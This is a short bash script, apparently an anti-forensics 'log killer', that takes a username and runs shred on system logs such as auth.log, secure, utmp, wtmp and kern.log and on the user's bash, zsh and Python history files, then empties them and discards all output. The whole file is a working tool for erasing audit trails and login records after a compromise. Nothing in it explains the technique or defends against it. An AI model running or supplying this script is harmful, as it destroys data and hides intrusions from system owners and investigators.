#!/bin/bash

main () {
    # The main function which runs the entire script
    
    local username="$1"
    declare_variables "$username"
    start_log_killer
}

declare_variables() {
    # A function which declares variables

    local username="$1"
    list_of_log_files=("/var/log/messages" "/var/log/auth.log" "/var/log/kern.log" "/var/log/cron.log" "/var/log/maillog" "/var/log/boot.log" "/var/log/mysqld.log" "/var/log/secure" "/var/log/utmp" "/var/log/wtmp" "/var/log/yum.log" "/var/log/system.log" "/var/log/DiagnosticMessages" "/home/$username/.zsh_history" "/home/$username/.bash_history" "/home/$username/.python_history")
}

start_log_killer() {
    # A function which overwrites the log files

    # Iterating over each log file in the list of log files
    for file in "${list_of_log_files[@]}"; do

        if [ -f "$file" ]; then

            # Shredding the file
            shred -vfzu "$file" && :> "$file"

        fi

    done &>/dev/null
}

main "$1"
